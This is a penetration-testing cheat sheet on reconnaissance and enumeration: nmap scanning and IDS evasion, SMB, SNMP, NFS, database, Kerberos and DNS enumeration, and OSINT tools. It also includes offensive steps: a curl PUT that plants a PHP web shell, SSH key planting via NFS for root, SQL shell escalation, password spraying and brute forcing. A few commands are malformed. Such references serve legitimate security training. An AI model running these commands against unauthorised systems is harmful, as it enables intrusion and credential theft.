# Information Gathering and Enumeration

Information Gathering, Reconnaissance and Enumeration

### Active Information Gathering/ Enumeration

**Definition** Active info gathering uses tools that interacts directly with the target to gather information such as IP addresses, open ports, services, software running, etc.

### Nmap

#### Conducting Normal Probing

**Basic scan to reveal services with their version**

You can control the intensity with `--version-intensity LEVEL` where the level ranges between 0, the lightest, and 9, the most complete. `-sV --version-light` has an intensity of 2, while `-sV --version-all` has an intensity of 9.

```
nmap -sV 10.10.10.3
```

It is important to note that using `-sV` will force Nmap to proceed with the TCP 3-way handshake and establish the connection. The connection establishment is necessary because Nmap cannot discover the version without establishing a connection fully and communicating with the listening service. In other words, stealth SYN scan `-sS` is not possible when `-sV` option is chosen.

**Performing a scan on a list of targets IPs/Domains**

```
nmap -iL targets.txt
```

**Scan services with OS detection**

```
nmap -sV -O 10.10.10.3
```

**Enabling fast mode**

```
nmap -sV -F -O 10.10.10.3
```

**Aggressive scan to reveal all details**

```
nmap -A 10.10.10.3
```

**Using scripting engine to scan for vulnerabilities**

&#x20;You can choose to run the scripts in the default category using `--script=default` or simply adding `-sC`  `nmap --script=default vuln 10.10.10.4`  Checking for vulnerabilities on the target we use the category `vuln`

```
nmap --script vuln 10.10.10.4
```

Some scripts belong to more than one category. Moreover, some scripts launch brute-force attacks against services, while others launch DoS attacks and exploit systems. Hence, it is crucial to be careful when selecting scripts to run if you don’t want to crash services or exploit them.

You can also specify the script by name using `--script "SCRIPT-NAME"` or a pattern such as `--script "ftp*"`, which would include `ftp-brute`. If you are unsure what a script does

**Performing service detection scan with full scripting engine scan**

```
nmap -sC -sV 10.10.10.5
```

**Performing a TCP connect scan on all ports, specifying a min number of packets and output the results to a file**

```
nmap -sT -p- --min-rate 10000 -oA scan-results.txt 10.10.10.5
```

**Performing UDP scan with aggressive speed**

UDP is a connectionless protocol, and hence it does not require any handshake for connection establishment. We cannot guarantee that a service listening on a UDP port would respond to our packets. However, if a UDP packet is sent to a closed port, an ICMP port unreachable error (type 3, code 3) is returned.

If we send a UDP packet to an open UDP port, we cannot expect any reply in return. Therefore, sending a UDP packet to an open port won’t tell us anything.

We expect to get an ICMP packet of type 3, destination unreachable, and code 3, port unreachable. In other words, the UDP ports that don’t generate any response are the ones that Nmap will state as open.

```
nmap -sU -T4  10.10.10.5
```

`-T4` is optional above.

**Performing host discovery scan using APP Packets**

```
nmap -PR -sn 10.10.210.6/24
```

**Performing ICMP timestamp request to discover live hosts**

```
nmap -PP -sn 10.10.210.6/24
-PE: ICMP mask request
-PE: ICMP echo request
```

**Performing TCP+ICMP scan to discover live hosts**

```
nmap -PS -sn 10.10.210.6/24  S: SYN
nmap -PA -sn 10.10.210.6/24  A: Acknowledgement
nmap -PU -sn 10.10.68.220/24 U: UDP 
```

You can go with \[T0] but it would be very slow. Acknowledgments scan are also useful for firewall evasion.

```
nmap -sA -T1 -f 10.10.10.5
```

**Scanning Most Common 100 Ports on Fast Mode**

If you want to scan the most common 100 ports, add `-F`. Using `--top-ports 10` will check the ten most common ports.

```
nmap --top-ports 100 -F IP
```

#### Firewall Detection&#x20;

It is essential to note that the ACK scan and the window scan are very efficient at helping map out the firewall rules. However, it is vital to remember that just because a firewall is not blocking a specific port, it does not necessarily mean that a service is listening on that port. For example, there is a possibility that the firewall rules need to be updated to reflect recent service changes. Hence, ACK and window scans are exposing the firewall rules, not the services.

**Using TCP ACK Scan**

An ACK scan will send a TCP packet with the ACK flag set. Use the `-sA` option to choose this scan. The target would respond to the ACK with RST regardless of the state of the port. This kind of scan would be helpful if there is a firewall in front of the target. Consequently, based on which ACK packets resulted in responses, you will learn which ports were not blocked by the firewall.

```
nmap -sA 10.10.224.131
```

**Using TCP Windows Scan**

The TCP window scan is almost the same as the ACK scan; however, it examines the TCP Window field of the RST packets returned. On specific systems, this can reveal that the port is open

```
sudo nmap -sW IP
```

**A Null scan**

```
nmap -sN  10.10.210.6
```

**Performing FIN**

```
nmap -FN 10.10.210.6
```

**Using Nmap scripting engine**

We can use http-waf- detect script to detect if there is a WAF in place.

```
nmap --script=http-waf-detect ip
```

#### Firewall Evasion

**Performing stealth and slow scan**

```
nmap -sS -T1 -f 10.10.10.5
```

**Performing Decoy scan to bypass firewall and IDS**

```
nmap -D ip1,ip2,yourip TARGET-IP
```

You can pickup any IP address and you can put as many as you want. The below specifies `RND` to indicate that the third and fourth IP addresses will be randomly generated.

```
nmap -D 10.10.0.1,10.10.0.2,RND,RND,yourip TARGET-IP
```

**Spoofed Scan**

For this scan to work and give accurate results, the attacker needs to monitor the network traffic to analyze the replies.

```
nmap -e eth0 -Pn -S SPOOFED_IP TARGET-IP
```

The above tells Nmap explicitly which network interface to use and not to expect to receive a ping reply. This scan will be useless if the attacker system cannot monitor the network for responses.

When you are on the same subnet as the target machine, you would be able to spoof your MAC address as well. You can specify the source MAC address using `--spoof-mac SPOOFED_MAC`. This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).

**Fragmented Scan**

In this scan, The IP data will be divided into 8 bytes or less. Adding another `-f` (`-f -f` or `-ff`) will split the data into 16 byte-fragments instead of 8. You can change the default value by using the `--mtu`; however, you should always choose a multiple of 8.

```
```

Note that if you added `-ff` (or `-f -f`), the fragmentation of the data will be multiples of 16. In other words, the 24 bytes of the TCP header, in this case, would be divided over two IP fragments, the first containing 16 bytes and the second containing 8 bytes of the TCP header.

**Changing useragent for firewall and IDS evasion**

```
nmap -sV --script-args http.useragent="useragenthere" ip
```

**Controlling the speed of the scan**

You can control the scan timing using `-T<0-5>`. `-T0` is the slowest (paranoid), while `-T5` is the fastest. To avoid IDS alerts, you might consider `-T0` or `-T1`. For instance, `-T0` scans one port at a time and waits 5 minutes between sending each probe, so you can guess how long scanning one target would take to finish. If you don’t specify any timing, Nmap uses normal `-T3`. Note that `-T5` is the most aggressive in terms of speed; however, this can affect the accuracy of the scan results due to the increased likelihood of packet loss. Note that `-T4` is often used during CTFs and when learning to scan on practice targets, whereas `-T1` is often used during real engagements where stealth is more important.

Alternatively, you can choose to control the packet rate using `--min-rate <number>` and `--max-rate <number>`. For example, `--max-rate 10` or `--max-rate=10` ensures that your scanner is not sending more than ten packets per second.

### Hping3

Hping is a packet generation (or packet crafting) tool that supports raw IP packets, ICMP, UDP, TCP, and a wide range of packet manipulation tricks, including setting flags, splitting packets, and many others. **TCP SYN scan**

```
root@kali:Hping3 -S [ip – domain ] -p [port] -c [number-of-packets-to-send]
```

**TCP ACK scan**

```
<root@kali:Hping3 -A [ip – domain ] -p [port] -c [number-of-packets-to-send]>
### A: For TCP ACK scan
```

### Port scanning with Netcat

```
nc -zv ip 1-65535 &> output && cat output | grep succeeded
```

### Port scan simple script

#### This script can be used in the absence of nmap and other scanning tools

**Linux**

```
#!/bin/bash
host=[ip-address]
for port in {1..65535}; do
timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
echo "port $port is open"
done
echo "Done"
```

**Windows**

```
C:\> for /L %I in (1,1,254) do ping -w 30 -n 1
192.168. l.%I I find "Reply" >> output.txt
```

### Scanning and Enumeration with OpenVas

#### Prep and Installation

\[1] Installing the components

```
apt-get install openvas-server openvas-client
openvas-plugins-base openvas-plugins-dfsg
```

\[2] Updating the database

```
openvas-nvt-sync
```

\[3] Adding a user with password

```
openvas-adduser
```

\[4] Allowing the user to scan the target IP/Network

```
accept <target-IP/s>
default deny
```

\[5] Starting the server

```
service openvas-server start
```

#### Scanning the network

**Using The Terminal** OpenVas will scan the target network from a list you supply through a text file. You can create a file named `host.txt` and add host(s) IP's per line. The contents of the `hosts.txt` would be such as below:

```
IP1
IP2
IP3
```

Then you can run the scan. Make sure to change `user` in the command with the user you created above.

```
openvas-client -q 127.0.0.1 9390 user nsrc+ws
hosts.txt openvas-output-.html -T txt -V -x
```

With `-T txt` you can change the output to html, i.e; `-T html` **Using The GUI** First step is to add the target IP/Subnet in the targets section as seen below Clicking on the star icon !\[\[openvas-addtarget.png]] Adding the target details !\[\[openvas-addtarget2.png]]

Next step is to add a task to scan the IP/Subnet \[1] !\[\[openvas-scans-addtask.png]] \[2] !\[\[openvas-scans-addtask2.png]]

#### Reporting

Reports can be viewed and inspected from the scans->reports tab !\[\[openvas-reports-1.png]] By clicking on the icon that shows the number of discovered vulnerabilities \[1] !\[\[openvas-viewing-reports-1.png]] \[2] !\[\[openvas-viewing-reports-2.png]]

#### Remediation

In the reports of the respected assets, you can view a list of vulnerabilities on which you can click to view more details including the detection, impact and suggested remediation as shown below !\[\[openvas-viewing-vulnerability-details.png]]

`Note` Before reporting a vulnerability for remediation, it is highly advised to confirm that it is not a false positive since vulnerability scanners are prone to such errors. While some vulnerabilities might be straightforward to confirm, such as those identified with default credentials that could be easily verified remotely, others might require some effort remotely or from the client end. In any case, when a vulnerability is identified as a false positive, it is recommended to flag it in the report in the tool for future reference.

### Enumerating SMB and NetBIOS

Server Message Block (SMB) is a communication protocol that provides shared access to files and printers. Enumerating Samba (SMB) shares seeks to find all available shares, which are readable and writable, and any additional information about the shares that can be gathered. \[Windows]

#### NetBIOS Definition

With the help of NetBIOS, applications on computers or printers connected to Ethernet or token rings can communicate with one another. NetBIOS provides the below services

1. Name service (NetBIOS-NS) for name registration and resolution via port **137**.
2. Datagram distribution service (NetBIOS-DGM) for connection less communication via port **138**.
3. Session service (NetBIOS-SSN) for connection-oriented communication via port **139**. **Port 135:** it is used for Microsoft **R**emote **P**rocedure **C**all between client and server to listen to the query of the client. Basically, it is used for communication between client- client and server -client for sending messages. **Port 137**\*:the name service operates on UDP port 137 **Port 138**: Datagram mode is connectionless; the application is responsible for error detection and recovery. In NBT, the datagram service runs on UDP port 138. **Port 139**: Session mode lets two computers establish a connection, allows messages to span multiple packets, and provides error detection and recovery. **Port 445:** It is used for SMB protocol (server message block) for sharing file between different operating system i.e. windows-windows, Unix-Unix and Unix-windows.

#### Enumeration

\[1] With smbclient

```
root@kali:smbclient -I TargetIP -L administrator -N -U "" 


root@kali:sudo smbclient -L \\\ip\\\sharename -U admin
```

\[2] With smbclient.py

```
root@kali:smbclient.py user@172.31.1.21
```

\[3] With enum4linux.pl

```
root@kali:enum4linux.pl (options) targetip
```

\[4] With nbscan

```
root@kali: wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgz 

root@kali:tar -xvzf nbtscan-source-1.0.35.tgz

root@kali:make root@kali:~/nbtscan# ./nbtscan
```

Then after installation, we can perform full scan on a single target or targets separated by a comma

```
root@kali: ./nbtscan -n -f IP(s)
```

You can also send the output to a file

```
root@kali: ./nbtscan -O output.txt target(s)
```

If the port the netbios service running on was different, then you can specify a port

```
root@kali: nbtscan -p PORT target(s
```

\[4]

```
net share
```

#### Mounting shares

The below command mounts a specific share by supplying empty username and password

```
mount -t cifs //ip/sharename /mnt -o user=,password=
```

You can also omit the options to supply username and password

#### Mounting VHD files

VHD files are usually created after creating a windows image backup. So if you stumple upon them while enumerating shares, you can mount them to have full visibility on the target file system.

```
guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup/file.vhd --inspector --ro /mnt2/
```

After `--add` make sure to add the path to the vhd file after you have mounted the complete share so this would be a path in your attacking machine.

### Enumerating SMB \[Linux]

\[1] With smbclient

```
root@kali:Smbclient //(ip) -U (username)
root@kali:Smbclient -L \\\\(ip)\\
```

\[2] with smbmap

```
root@kali: smbmap -H ip
#list all shares with permissions

root@kali: smbmap -H $ip -R $sharename
# Recursively list dirs, and files

root@kali:smbmap -u '' -p '' -H $ip

root@kali:smbmap -u guest -p '' -H $ip

root@kali:smbmap -u user -p pass -d workgroup -H 192.168.0.1
# With credentials
```

\[3] With enum4linux

```
enum4linux IP
```

The above command will perform full SMB enumeration and gives out users information, NBstat info, OS info, Shares, Groups, Printers etc.

To narrow down enumeration, we can enumerate for the users only

```
enum4linux -U IP
```

#### Specifying a minimum version for SMBv1

Specifying a minimum version for SMBv1

```
root@kali:Smbclient //(ip) -U (username) –option='client min protocol=NT1'
```

The above command is useful if getting error protocol negotiation failed: `NT_STATUS_CONNECTION_DISCONNECTED`

#### Logging in without username and specifying it later

```
root@kali:Smbclient //[ip]
smb: \> logon [username]
```

#### Accessing a share

\[1]

```
smbclient -N //ip/share -U "username"
root@kali:Smbclient  \\\\(ip)\\share-name
```

\[2] The below command enumerates the contents of the share.

```
smbmap -u username -H ip -R sharename
```

#### Finding the path of every share

```
nmap -p 445 --script=smb-enum-shares ip
```

### Enumerating SNMP

The Simple Network Management Protocol (SNMP) is a protocol **used in TCP/IP networks to collect and manage information about networked devices.** It lets you know about various network events, from a server with a faulty disk to a printer out of ink. Simple network management protocol runs on a UDP port \[161]. When enumerating SNMP, we look to find the community string by which we can then get more information about current network interface, routers and other connected devices.

#### SNMP Components

* `Managed Device` A network device that has the SNMP service activated and permits unidirectional (read) or bidirectional (read/write) communication is referred to as a managed device (sometimes known as a "node"). Any networked equipment, including servers, firewalls, and routers, can be a managed device.
* `Agent` The software that is now executing on the controlled device—the agent—is in charge of managing communication. For the Network Management System, the agent converts device-specific configuration parameters into an SNMP format.
* `Network Management System (NMS)` The software responsible for controlling and keeping track of networked devices is called the Network Management System. There will always be at least one NMS on a network that is managed by SNMP.
* `The SNMP Management Information Base` (MIB) is a database that contains information about the network device. When the Network Management System (NMS) sends a ‘get’ request for information about a managed device on the network, the agent service returns a structured table with data. This table is what is called the Management Information Base (MIB). MIB values are indexed using a series of numbers with dots.
* `The SNMP community string` is like a username or password that allows access to the managed device. There are three different community strings that allow a user to set (1) read-only commands, (2) read and write commands and (3) traps. Most SNMPv1 and SNMPv2 devices ship from the factory with a default read-only community string set to **‘public’** and the read-write string set to ‘private’.

#### With onesixtyone and snmpwalk

Below command uses \[onesixtyone] to try with a list of common community strings against the target.

```
onesixtyone domain.com -c /usr/share/doc/onesixtyone/dict.tx
```

Say you found the community string to be \[public] then we can use that to start the enumeration process with \[snmpwalk] and probably we can find users as well

```
snmpwalk -v2c -c public target-ip > output.txt
```

If you are looking for extracting \[IPv6] addresses then use the below command

```
snmpwalk -v2c -c public target-ip ipAddressIfIndex.ipv6 | cut -d'"' -f2 | grep 'de:ad' | sed -E 's/(.{2}):(.{2})/\1\2/g'
```

\[cut] and \[grep] are used to extract the \[ipv6] addresses and only the routable ones.

#### With snmpenum.pl

Say that we know the community string to be `public` then we can run a full scan with below command

```
perl snmpenum.pl IP public users-wordlist.txt
```

The above command will perform SNMP scan and will return a possible list of users on the system so that you can perform password attacks.

#### With snmpcheck

Cloning the tool

```
git clone https://gitlab.com/kalilinux/packages/snmpcheck.git cd snmpcheck/ 
```

Installing and assigning permissions

```
gem install snmp 
chmod +x snmpcheck-1.9.rb
```

Running Below we assume that the community string is `public`

```
snmpcheck.rb ip -c public | more
```

### Enumerating NFS shares

Runs on **port 111 and 2049 tcp/udp**

#### Listing the shares

```
root@kali:Showmount -e [target-ip]
```

#### Mounting a share

\[1]

```
root@kali:Mount -t nfs [hostname or ip]:/path-to-share [path to local mount point]

root@kali:Mount -t nfs 192.168.1.1:/var/backups /mnt/backups
```

\[2]

```
root@kali:Mount -t cifs -o username=admin , password=password //192.168.1.1/shares /mnt/shares
```

#### Unmounting shares

```
root@kali:umount -f -l /mnt/nfs
```

#### Writing SSH keys to the NFS share

If the NFS shares of the target system allows you to write files then you can write SSH keys to the share and login to have root access

```
root@kali:ssh keygen
root@kali:cat ~/.ssh/id_rsa.pub >> /mnt/nfs/root/.ssh/authorized_keys
root@kali:ssh root@$ip
```

### Enumerating MYSQL

Runs on port 3306 and indicate a mysql server installed on the target.

#### Logging in

```
mysql -u root
# Connect to root without password

mysql -u root -p
# A password will be asked

mysql -h <Hostname> -u root
# if the target is remote
```

#### Extracting all database details

This requires you to have the correct login credentials.

```
mysqldump -u admin -p pass --all-databases --skip-lock-tables 
```

#### From Mysql to Root

If you get access to the mysql server as root you can have a root shell

```
mysql> select do_system('id');

mysql> \! sh
```

#### MYSQL Configs

**Windows**

```
config.ini
my.ini
windows\my.ini
winnt\my.ini
<InstDir>/mysql/data/
```

**Linux**

```
my.cnf
/etc/mysql
/etc/my.cnf
/etc/mysql/my.cnf
/var/lib/mysql/my.cnf
~/.my.cnf
/etc/my.cnf
```

#### History of commands

```
~/.mysql.history
```

### Enumerating Oracle

Oracle runs on port 1521 and indicates an Oracle database installation on the target. Oracle DB uses TNS-listener to run on port 1512 so usually TNS-listener enumeration is part of the overall enumeration process

#### Enumerating DB users

This requires knowledge of the DB SID. You can find it using below command

```
nmap --script=oracle-sid-brute $ip
```

Say the SID is `ORCL` then you can execute the below

```
nmap -n -v -sV -Pn -p 1521 –script=oracle-enum-users –script-args sid=ORCL,userdb=users.txt $ip
```

#### Finding the TNS version

```
nmap --script "oracle-tns-version" -p 1521 -T4 -sV $ip
```

### Enumerating MsSQL Server

MsSQL server runs on port 1433 and indicates an installation of **Microsoft SQL Server** which is a [relational database management system](https://en.wikipedia.org/wiki/Relational\_database\_management\_system) developed by [Microsoft](https://en.wikipedia.org/wiki/Microsoft).

#### Complete Enumeration

The below will reveal complete info about the MsSQL server installed and its parameters.

```
nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
```

#### BruteForcing Users and Passwords

```
nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt $ip
```

#### Logging in with credentials

```
mssqlclient.py domain/admin:pass@ip
```

#### Dropping a shell

```
SQL> enable_xp_cmdshell
```

### Using Curl for enumeration

#### Grabbing headers

```
curl --head [domain.com]
```

#### Sending post requests with form data.

Say we would like to send a post request with username and password from a login form

```
curl -d "username=admin&host=password" -X POST http://domain.com/login.php
```

#### Uploading files/shells

Using POST Method

```
curl -X POST -F "file=path-to-shell/shell.php" http://$ip/upload.php --cookie "cookie"
```

Using PUT Method

```
curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
```

### Kereberos Enumeration

#### Enumerating usernames and Tickets on Kereberos

```
root@kali:./kerbrute_linux_amd64 userenum -d pentesting.local –dc [ip] [path-to-usernames-wordlist]
```

#### Check if a user among users in Active directory has a specified password in the input \[Password Spray Attack]

```
root@kali:./kerbrute_linux_amd64 passwordspray -v -d pentesting.local –dc [ip] [users-list.txt] [the password]
```

#### Getting password hashes and TGTs for identified users in the previous Kerebros enumeration \[ASREP ROASTING]

```
root@kali:python3 GetNPUsers.py -dc-ip [ip] pentesting.local/ -usersfile [list-of-found-users-from-command-above]
```

#### Brute forcing usernames and passwords with Kereberos \[Kerebroasting]

```
root@kali:python kerbrute.py -domain pentesting.local -users users.txt -passwords passwords.txt -outputfile passwords-found.txt
```

### Enumerating web application directories with gobuster and dirbuster

#### Regular scan with wordlist

```
root@kali:dirb http://10.5.5.25:8080/ -w
 ### -w: to continue enumerating past the warning messages
root@kali:gobuster dir -u ‘url’ -w [path-to-wordlist]
```

#### Directory enumeration with file extensions specified

```
root@kali:dirb http://10.5.5.25:8080/ -w -e php,html,txt,js 
```

#### Filtering output

Lets say we want to filter out 403 responses

```
root@kali:dirb http://10.5.5.25:8080/ -w -e php,html,txt,js  -x 403
```

#### Increasing the scan speed

```
root@kali:dirb http://10.5.5.25:8080/ -w -e php,html,txt,js  -x 403 -t 50
```

#### Enumerating a site running Microsoft sharepoint

A site running shaepoint server has many directories but most importantly are the below ones

```
/shared documents/forms/allitems.aspx [1]
/_layouts/viewlsts.aspx [2]
/SitePages/Forms/AllPages.aspx [3]
```

You can deduce the above directories using the below command

```
root@kali: gobuster -w /usr/share/seclists/Discovery/WebContent/CMS/sharepoint.txt -u [url]
```

### Enumeration Directories with wfuzz

We can enumerate directories, URL parameters and even perform brute force attacks on usernames and passwords with wfuzz.

#### Enumerating for files

The below command enumerates files using \[big.txt] wordlist.

```
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt http://domain.com/FUZZ
```

\[-c] shows the output in colors \[-z] specifies what we enumerate. In the command above we are enumerating files

#### Performing password attack

The below command performs brute force attack on a login form. We use \[-d] to speficy the data we are FUZZING.

```
wfuzz -c -z file,mywordlist.txt -d “username=FUZZ&password=FUZZ” -u http://domain.com/login.php
```

### Enumerating Directories, Files, Parameters and Brute Forcing passwords with ffuf

#### Enumerating Extensions

```
ffuf -u http://domain.com/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
```

#### Enumerating Directories

```
ffuf -u http://domain.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

#### Enumerating Files

```
ffuf -u http://domain.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .php,.txt
```

#### Filtering for 403 status codes

```
ffuf -u http://domain.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -fc 403
```

#### Showing only 200 status codes

```
ffuf -u http://domain.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -mc 200
```

#### Fuzzing parameters

```
 ffuf -u 'http://domain.com/page?FUZZ=1' -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw 39
```

#### Numeric wordlist as STDOUT

```
$ for i in {0..255}; do echo $i; done | ffuf -u 'http://domain.com/page?id=FUZZ' -c -w - -fw 33
```

#### Brute Forcing passwords in login forms

```
ffuf -u http://domain.com/login -c -w /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt -X POST -d 'uname=Dummy&passwd=FUZZ&submit=Submit' -fs 1435 -H 'Content-Type: application/x-www-form-urlencoded'
```

### Enumerating samba shares

```
root@kali:smbclient –N –L \\\\ip
root@kali:smbclient  \\\\ip\\[sharename]
get [filename]
```

### Enumerating and interacting with svnserve

Usually runs on port 3690

#### Connect and display info about the server

```
root@kali:Svn info svn://domain.com
```

#### Display files on the current directory

```
root@kali:Svn list svn://domain.com
```

#### Export specific file from the server

```
root@kali:Svn export svn://domain.com/file.txt
```

#### Checking out revisions

```
root@kali:Svn checkout -r 1 svn://domain.com
root@kali:Svn checkout -r 2 svn://domain.com
```

### Enumerating and interacting with RPC clients

Usually run on port 111

#### Logging in

```
root@kali:Rpcclient [ip-or dns name] -U ‘username’
```

Use the option `-N` to login with no password.

#### Logging in with hash

```
root@kali:Rpcclient --pw-nt-hash -U [username] [ip-or-domain]
```

#### Querying and displaying info after logging in

```
rpcclient $>querydispinfo
```

#### Display users and groups

```
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
```

#### Displaying info about a specific group

```
rpcclient $> querygroup 0x200
```

`0x200` is the group rid which you can get it from the output of the command `enumdomgroups` You can also find the members of the group

```
querygroupmem 0x200
```

This will give you the rid of the user who is member of the group. You can then find that user by correlating the RID you found with the list of users you extracted using `enumdomusers`

#### Display privileges

```
rpcclient $> enumprivs
```

#### Display Printers

```
rpcclient $> enumprinters
```

### Enumerating and interacting with MSRPC TCP 135

#### Listing Current RCP mappings and interfaces \[requires impacket]

```
root@kali:python rpcmap.py 'ncacn_ip_tcp:10.10.10.213'
```

#### Identifying hosts and other endpoints

```
root@kali:python IOXIDResolver.py -t 10.10.10.21
```

#### Finding if its vulnerable to PrintNightMare or print spooler service vulnerability CVE-2021-1675 / CVE-2021-34527

```
rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
```

rpcdump.py is part of impacket tools.

### Enumerating Rsync

Rsync is a linux tool for remote and local file and directory synchronization.

#### Connecting to a remote rsync server

```
rsync rsync://rsync-connect@ip-address/
```

#### Listing synced files

```
rsync rsync://rsync-connect@ip-address/Conf
Conf is an example
```

#### Downloading a file

```
rsync -v rsync://rsync-connect@ip-address/Conf/filename [~/Desktop/file]
```

#### Uploading a file back to the server

```
rsync -v [~/Desktop/file] rsync://rsync-connect@ip-address/Conf/filename 
```

### Enumerating Drupal CMS

#### scanning for vulnerabilities

```
root@kali: /opt/droopescan/droopescan scan drupal -u http://ip]
```

#### Finding the version

```
domain.com/CHANGELOG.txt
```

### SMTP Enumeration

SMTP is the protocol used in sending and receiving emails along with IMAP and POP3 and it runs on port 25. If the port 25 is open then we conduct SMTP enumeration to find users, server version,passwords,etc.

#### SMTP enumeratiuon Tools

**smtp-user-enum**

Username guessing tool primarily for use against the default Solaris SMTP service. Can use either EXPN, VRFY or RCPT TO.

```
https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum
```

To run the tool, we have to feed it with a user list of possible email addresses that we expect to exist.

```
smtp-user-enum -M RCPT -U users-list.txt -t target-ip
```

You can also use `-M VRFY`

**With Metasploit**

We can use the below module

```
auxiliary/scanner/smtp/smtp_enum
```

**With NMAP**

```
nmap –script smtp-enum-users.nse IP
```

### POP3 Enumeration

Its the equivalent of IMAP protocol to receive and store emails on the host machine however POP3 deletes the messages from the server and doesn't sync across multiple devices like IMAP does.

Runs on port 110

The below command will return a wealth of info about the pop3 server installed

```
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> <IP> #All are default scripts
```

You can try to login to a pop3 server using telnet

```
telnet $ip 110
```

And if it was successful, you can refer to the below pop3 commands

```
USER uid 
Log in as "uid"

PASS password 
Substitue "password" for your actual password

STAT 
List number of messages, total mailbox size

LIST 
List messages and sizes

RETR n 
Show message n

DELE n 
Mark message n for deletion

RSET 
Undo any changes

QUIT 
Logout (expunges messages if no RSET)

TOP msg n 
Show first n lines of message number msg

CAPA 
Get capabilities
```

### Info Gathering Frameworks

#### Recon-ng

[Recon-ng](https://github.com/lanmaster53/recon-ng) is a framework that helps automate the OSINT work. It uses modules from various authors and provides a multitude of functionality. Some modules require keys to work; the key allows the module to query the related online API.

All the data collected is automatically saved in the database related to `your workspace` which means the first step is creating a workspace under which all the results will be stored in the respective tables.

**Creating a workspace**

```
workspaces create workspace-name
```

**Listing Tables**

This will list the tables and the values stored in them. Remember that all the recon results are stored in the database tables in the workspace you created.

```
db schema
```

**Inserting a value in a table**

Say you want to start the recon with a domain name, then you will want to insert the domain name into the respective table

```
db insert domains
```

This will bring up the below

```
[recon-ng][thmredteam] > db insert domains domain (TEXT): example.com 
notes (TEXT): engagement-v1
```

Above, we inserted the domain in question and some notes for reference.

**Installing and Loading Modules**

Modules are necessary to perform your recon. They can be installed and loaded from the marketplace.

* `marketplace search KEYWORD` to search for available modules with _keyword_.
* `marketplace info MODULE` to provide information about the module in question.
* `marketplace install MODULE` to install the specified module into Recon-ng.
* `marketplace remove MODULE` to uninstall the specified module.
* `modules search` to get a list of all the installed modules
* `modules load MODULE` to load a specific module to memory
* `options list` to list the options that we can set for the loaded module.
* `options set <option> <value>` to set the value of the option.

**API Keys and Dependencies**

Some modules require a key and its indicated by a `*` under the `K` column when you attempt to search modules in the marketplace. This requirement indicates that this module is not usable unless we have a key to use the related service. Other modules have dependencies, indicated by a `*`under the `D` column. Dependencies show that third-party Python libraries might be necessary to use the related module. Remember the below commands to interact with keys

* `keys list` lists the keys
* `keys add KEY_NAME KEY_VALUE` adds a key
* `keys remove KEY_NAME` removes a key

### Passive Info Gathering/OSINT

#### Definition

The process of gathering information about the target's system, network and defenses with engaging it directly. OSINT includes data from publicly available sources, such as DNS registrars, web searches, security-centric search engines like Shodan and Censys. Another type of open source intelligence is information about vulnerabilities and other security flaws, including sources like the Common Vulnerabilities and Exposures (CVE) and Common Weakness Enumeration (CWE) resources. **Examples of information that can be gathered during an engagement**

* Domain names and subdomains
* IP Address ranges
* Email addresses
* Physical locations
* Staff list and organization chart.
* Documents' meta data.
* Social media information
* Technologies and infrastructure.

#### Tools

**DNS Enumeration**

**nslookup**

```
nslookup -type=[type-of-dns-record] example.com
nslookup -type=mx google.com
nslookup domain
```

**dig**

Example below querying A records

```
dig example.com A
```

Specifying which DNS server to query. In the below query we specified \[8.8.8.8] as the DNS server to query for the domain \[example.com]

```
dig @8.8.8.8 example.com
```

To query all records, we use \[any]

```
dig example.com ANY
```

Displaying short answer

```
dig example.com +short
```

Displaying detailed information

```
dig example.com +noall +answer
```

Reverse DNS lookup which is looking up a domain using its ip address

```
dig -x [ip]
```

Enumerating multiple entries using a file. We can create a txt file and add multiple domains one per line and then query them all

```
dig -f domains.txt +short
```

You can also specify a nameserver to query information from

```
dig domain @1.1.1.1
```

`@1.1.1.1` is cloudflare nameservers Performing zone transfer

```
dig axfr @target.nameserver.com domain.name
```

**DnsDumpster**

```
dnsdumpster.com
```

**Enumerating subdomains, email addresses and hosts**

**TheHarvester**

\[emails]

```
root@kali: theharvester -d (target-domain) -b all -h results.html
```

**Web-based tools for email harvestin\`**

```
https://hunter.io/
https://osintframework.com/
```

**Dnsrecon**

```
root@kali:dnsrecon -d [domain]
```

**sublist3r**

```
sublist3r.py -d [domain]
```

**ffuf**

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs {size}
```

**Google Dorks**

```
-site:www.domain.com site:*.domain.com
```

**Certificate Logs**

```
https://crt.sh/
```

**Gobuster**

```
gobuster vhost -u domain.com -w wordlist
```

**Zone Transfers**

```
host -t axfr domain.name dns-server
```

**Metasploit**

We can enumerate emails using Metasploit modules. Use the below module and set the domain name of the target in the options and run it.

```
/auxiliary/gather/search_email_collector
```

**ipinfo**

IP Address Lookup

```
https://ipinfo.io/
```

**urlscan**

Per the [site](https://urlscan.io/about/), "urlscan.io is a free service to scan and analyse websites. When a URL is submitted to urlscan.io, an automated process will browse to the URL like a regular user and record the activity that this page navigation creates. This includes the domains and IPs contacted, the resources (JavaScript, CSS, etc) requested from those domains, as well as additional information about the page itself. urlscan.io will take a screenshot of the page, record the DOM content, JavaScript global variables, cookies created by the page, and a myriad of other observations. If the site is targeting the users one of the more than 400 brands tracked by urlscan.io, it will be highlighted as potentially malicious in the scan results".

```
https://urlscan.io/
```

